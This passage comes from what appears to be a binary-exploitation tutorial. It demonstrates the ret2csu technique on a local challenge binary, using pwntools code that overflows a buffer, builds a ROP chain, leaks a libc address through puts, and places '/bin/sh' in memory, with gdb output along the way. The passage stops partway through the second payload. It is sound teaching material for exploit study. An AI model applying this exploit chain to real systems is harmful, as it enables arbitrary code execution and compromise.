</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040068e</span> <span class="err">&lt;+</span><span class="mi">94</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r13</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400690</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400692</span> <span class="err">&lt;+</span><span class="mi">98</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">pop</span>    <span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400694</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>  
</span></span></code></pre></div><p>Firstly, the lines with <code>mov</code> instruction are transferring the values of the registers of left operand to right operand. Then the <code>call</code> keyword is calling the subroutine calculated by at offset <code>r12 + rbx * 8</code>, and with the square brackets around them means the indirect addressing, this will make the <code>call</code> instruction to jump at that subroutine at the given address. Now, the <code>add rbx, 1</code> will increment the value of <code>rbx</code> by <code>1</code>. Then the value of <code>rbp</code> and <code>rbx</code> is compared, if they are not equal the RIP will be set to  <code>__libc_csu_init + 64</code>. If it is equal, then the stack size will be increased by 8 and the registers <code>rbx</code>, <code>rbp</code>, <code>r13</code>, <code>r14</code> and <code>r14</code> will be popped.</p>
<hr>
<h1 id="payload-part-1" class="relative group">Payload: Part 1 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#payload-part-1" aria-label="Anchor">#</a></span></h1><p>Now, since we are done with theoretical aspects of this technique, it&rsquo;s time to try it practically. What we gonna do here is, chain the ROP chain from which we were able to input <code>&quot;/bin/sh&quot;</code>, and we are going to leak a GOT address in order to calculate the LIBC base address, then we will call main again.</p>
<p>Let&rsquo;s build a ROP chain:-</p>
<p>Some prologue and predefined variables:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;chall&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">writable_address</span> <span class="o">=</span> <span class="mh">0x601150</span> <span class="c1"># writale address</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400693</span>   <span class="c1"># pop rdi; ret;</span>
</span></span></code></pre></div><p>Enter the <code>/bin/sh</code> string to the wriitable address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Padding to `RIP` register</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c1"># The `pop rdi; ret;`, this will wait for input</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span><span class="p">)</span> <span class="c1"># The address is passed to `rdi` register</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="c1"># This will call the `gets` with it&#39;s first argument as the writable address</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">gets(writable_address);
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>You know about what is happening here from earlier. Let&rsquo;s move to other:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c1"># This will pop the `rdi` register which will wait for contents to be loaded in. </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="c1"># This `GOT` address of `puts` will be given to `rdi` register, hence the first argument of puts</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="c1"># This will call `puts` with the `elf.got[&#39;puts&#39;]`</span>
</span></span></code></pre></div><p>This part is doing a bit of what is happening with the above part, the differnce is <code>puts</code> will print the value provided as first argument, here the <code>GOT</code> address will point to the LIBC address of the function which means it&rsquo;ll print the address of <code>puts</code> from the LIBC.</p>
<p>Now, let&rsquo;s send the payload and parse the leaked LIBC address:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span> <span class="c1"># This will shift the `RIP` to `main` function, hence calling the function again.</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;warrior</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Robin&#34;</span><span class="p">)</span> <span class="c1"># This will be given to the first input program is asking for.</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;me?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Now, we will send the payload.</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># The `/bin/sh` string is being sent such that it&#39;d be stored to the writable address.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="c1"># Receiving the address and padding it such that it&#39;ll be 8 bytes. </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="c1"># Subtracting the leaked address from the LIBC absolute address of `puts` will  give us the base address.</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;puts@libc : &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span> <span class="c1"># Printing the leaked address.</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc      : &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span> <span class="c1"># Printing the libc base address</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;&#39;/bin/sh&#39; : &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">writable_address</span><span class="p">))</span> <span class="c1"># Printing `/bin/sh` address.</span>
</span></span></code></pre></div><p>Let&rsquo;s run the script and check it in <code>gdb</code> if we are on the right way or not:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">pwn1$</span> <span class="no">python3</span> <span class="no">xpl.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">14517</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, attach it to <code>gdb</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">pwn1$</span> <span class="no">gdb-gef</span> <span class="p">-</span><span class="no">q</span> <span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="no">chall...</span><span class="p">(</span><span class="no">no</span> <span class="no">debugging</span> <span class="no">symbols</span> <span class="no">found</span><span class="p">)...</span><span class="no">done.</span>
</span></span><span class="line"><span class="cl"><span class="nf">GEF</span> <span class="no">for</span> <span class="no">linux</span> <span class="no">ready</span><span class="p">,</span> <span class="no">type</span> <span class="err">`</span><span class="no">gef</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">start</span><span class="p">,</span> <span class="err">`</span><span class="no">gef</span> <span class="no">config</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">configure</span>
</span></span><span class="line"><span class="cl"><span class="err">78</span> <span class="nf">commands</span> <span class="no">loaded</span> <span class="no">for</span> <span class="no">GDB</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span> <span class="no">using</span> <span class="no">Python</span> <span class="no">engine</span> <span class="mi">3</span><span class="no">.6</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">2</span> <span class="nf">commands</span> <span class="no">could</span> <span class="no">not</span> <span class="no">be</span> <span class="no">loaded</span><span class="p">,</span> <span class="no">run</span> <span class="err">`</span><span class="no">gef</span> <span class="no">missing</span><span class="err">`</span> <span class="no">to</span> <span class="no">know</span> <span class="no">why.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">attach</span> <span class="mi">14517</span>
</span></span><span class="line"><span class="cl"><span class="nf">Attaching</span> <span class="no">to</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="p">,</span> <span class="no">process</span> <span class="mi">14517</span>
</span></span><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6...Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="err">/</span><span class="no">usr</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">debug</span><span class="c1">//lib/x86_64-linux-gnu/libc-2.27.so...done.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">x</span><span class="err">/</span><span class="no">read.c</span><span class="p">:</span><span class="mi">27</span>
</span></span><span class="line"><span class="cl"><span class="err">27</span>	<span class="nf">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">sysv</span><span class="err">/</span><span class="no">linux</span><span class="err">/</span><span class="no">read.c</span><span class="p">:</span> <span class="no">No</span> <span class="no">such</span> <span class="no">file</span> <span class="no">or</span> <span class="no">directory.</span>
</span></span></code></pre></div><p>Let&rsquo;s continue the process with <code>continue</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">continue</span>
</span></span><span class="line"><span class="cl"><span class="nf">Continuing.</span>
</span></span></code></pre></div><p>Now, resuming the script:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">pwn1$</span> <span class="no">python3</span> <span class="no">xpl.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">14517</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">puts@libc</span> <span class="p">:</span> <span class="mi">0x7effdfd759c0</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">libc</span>      <span class="p">:</span> <span class="mi">0x7effdfcf5000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span> <span class="p">:</span> <span class="mi">6295888</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Welcome</span> <span class="no">to</span> <span class="no">the</span> <span class="no">world</span> <span class="no">of</span> <span class="no">Pwning</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span><span class="err">&#39;</span><span class="no">d</span> <span class="no">like</span> <span class="no">to</span> <span class="no">know</span> <span class="no">the</span> <span class="no">name</span> <span class="no">of</span> <span class="no">brave</span> <span class="no">warrior</span>  
</span></span><span class="line"><span class="cl"><span class="no">$</span>  
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">Welcome</span> <span class="no">to</span> <span class="no">the</span> <span class="no">world</span> <span class="no">of</span> <span class="no">Pwning</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span><span class="err">&#39;</span><span class="no">d</span> <span class="no">like</span> <span class="no">to</span> <span class="no">know</span> <span class="no">the</span> <span class="no">name</span> <span class="no">of</span> <span class="no">brave</span> <span class="no">warrior</span>  
</span></span><span class="line"><span class="cl"><span class="no">$</span>  
</span></span></code></pre></div><p>This is printed because we called the <code>main</code> again.</p>
<hr>
<p>Now, we will Interrupt the execution of program inside gdb to check if the address are correct:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="no">puts</span>
</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="err">{</span><span class="no">int</span> <span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*)</span><span class="err">}</span> <span class="mh">0x7effdfd759c0</span> <span class="p">&lt;</span><span class="no">_IO_puts</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span>  <span class="nf">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400000</span> <span class="mi">0x0000000000401000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000600000</span> <span class="mi">0x0000000000601000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000601000</span> <span class="mi">0x0000000000602000</span> <span class="mi">0x0000000000001000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000001987000</span> <span class="mi">0x00000000019a8000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">heap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007effdfcf5000</span> <span class="mi">0x00007effdfedc000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">6295888</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x601150:</span>	<span class="err">&#34;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span>
</span></span></code></pre></div><p>Awesome! Everything seems to be right. Now, we will go through second payload:-</p>
<h1 id="payload-part-2" class="relative group">Payload: Part 2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#payload-part-2" aria-label="Anchor">#</a></span></h1><p>Now, this payload is crucial since this is where the actual <code>ret2csu</code> is, I&rsquo;ll try to explain as much as I can:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Padding to `RIP` register</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40068a</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">0x000000000040068a &lt;+90&gt;:	pop    rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068b &lt;+91&gt;:	pop    rbp
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068c &lt;+92&gt;:	pop    r12
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068e &lt;+94&gt;:	pop    r13
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400690 &lt;+96&gt;:	pop    r14
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400692 &lt;+98&gt;:	pop    r15
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400694 &lt;+100&gt;:	ret    
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `rbx` register</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span> <span class="c1"># Passed to `rbp`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600e38</span><span class="p">)</span> <span class="c1"># Passed to `r12` </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span><span class="p">)</span> <span class="c1"># Passed to `r13`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `r14`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `r15`</span>
</span></span></code></pre></div><p>So, as you remember the following instructions:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span></code></pre></div><p>That&rsquo;s why we provided the value we wanted in <code>rdx</code>, <code>rsi</code> and <code>rdi</code> to <code>r15</code>, <code>r14</code> and <code>r13</code> respectively. The values passed to <code>rbx</code> and <code>rbp</code> have their importance when we call next chain. But first, let&rsquo;s run the script and attach it to gdb such that we can check content registers:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `rbx` register</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span> <span class="c1"># Passed to `rbp`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600e38</span><span class="p">)</span> <span class="c1"># Passed to `r12` </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_address</span><span class="p">)</span> <span class="c1"># Passed to `r13`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `r14`</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># Passed to `r15`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;warrior</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Robin&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;me?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
